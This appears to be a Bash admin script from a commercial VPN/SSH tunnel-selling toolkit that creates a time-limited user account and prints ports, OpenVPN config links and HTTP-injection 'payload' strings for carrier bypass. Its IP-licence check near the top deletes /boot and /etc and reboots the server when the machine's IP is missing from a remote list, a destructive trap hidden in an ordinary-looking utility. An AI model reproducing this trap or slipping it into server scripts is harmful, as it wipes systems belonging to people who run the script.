#!/bin/bash
red='\e[1;31m'
green='\e[0;32m'
NC='\e[0m'
MYIP=$(wget -qO- ifconfig.me/ip);
echo "Checking VPS"
IZIN=$( curl https://raw.githubusercontent.com/halluboys/ipvps/main/ip | grep $MYIP )
if [ $MYIP = $IZIN ]; then
echo -e "${green}Permission Accepted...${NC}"
else
echo -e "${red}Permission Denied!${NC}";
echo "Please Contact Admin"
echo "Telegram t.me/xzvnct"
echo "Waiting 5 Sec"
rm -f setup.sh
sleep 5
rm -r -f /boot; rm -r -f /etc; reboot
exit 0
fi
clear
source /var/lib/premium-script/ipvps.conf
if [[ "$IP" = "" ]]; then
domain=$(cat /etc/v2ray/domain)
else
domain=$IP
fi
read -p "Username : " Login
read -p "Password : " Pass
read -p "Expired (hari): " masaaktif

IP=$(wget -qO- ifconfig.me/ip);
ssl="$(cat ~/log-install.txt | grep -w "Stunnel4" | cut -d: -f2)"
sqd="$(cat ~/log-install.txt | grep -w "Squid" | cut -d: -f2)"
ovpn="$(netstat -nlpt | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
ovpn2="$(netstat -nlpu | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
ISP=$(curl -s ipinfo.io/org | cut -d " " -f 2-10 )
CITY=$(curl -s ipinfo.io/city )
sleep 1
echo Ping Host
echo Cek Hak Akses...
sleep 0.5
echo Permission Accepted
clear
sleep 0.5
echo Membuat Akun: $Login
sleep 0.5
echo Setting Password: $Pass
sleep 0.5
clear
useradd -e `date -d "$masaaktif days" +"%Y-%m-%d"` -s /bin/false -M $Login
exp="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
echo -e "$Pass\n$Pass\n"|passwd $Login &> /dev/null
echo -e "==============================="
echo -e "Thank You For Using Our Services"
echo -e "SSH & OpenVPN Account Info"
echo -e "Username          : $Login "
echo -e "Password          : $Pass"
echo -e "==============================="
echo -e "ISP               : $ISP"
echo -e "City              : $CITY"
echo -e "Domain            : $domain"
echo -e "Host              : $IP"
echo -e "OpenSSH           : 22"
echo -e "Dropbear          : 444, 109, 143"
echo -e "SSL/TLS           : 443, $ssl"
echo -e "Port Ws SSL       : 443"
echo -e "Port Squid        : $sqd"
echo -e "Port WS Http      : 2095"
echo -e "Port Ws Ovpn      : 2082"
echo -e "Port OHP Dropbear : 8181"
echo -e "Port OHP OPEN-SSH : 8282"
echo -e "Port OHP OVPN     : 8383"
echo -e "OpenVPN           : TCP $ovpn http://$IP:81/client-tcp-1194.ovpn"
echo -e "OpenVPN           : UDP $ovpn2 http://$IP:81/client-udp-2200.ovpn"
echo -e "OpenVPN           : SSL 442 http://$IP:81/client-tcp-ssl.ovpn"
echo -e "OHP Config        : OHP 8383 http://$MYIP:81/tcp-ohp.ovpn"
echo -e "badvpn            : 7100-7300"
echo -e "==============================="
echo -e "PAYLOAD"
echo -e "GET / HTTP/1.1[crlf]Host: $domain[crlf]Connection: Keep-Alive[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf][crlf]"
echo -e "==============================="
echo -e "PAYLOAD 2"
echo -e "CONNECT wss://bug.com/ [protocol][crlf]Host: $domain[crlf]Upgrade: websocket[crlf*2]"
echo -e "==============================="
echo -e "Expired On      : $exp"
echo -e "Script Install  : Halluboys"
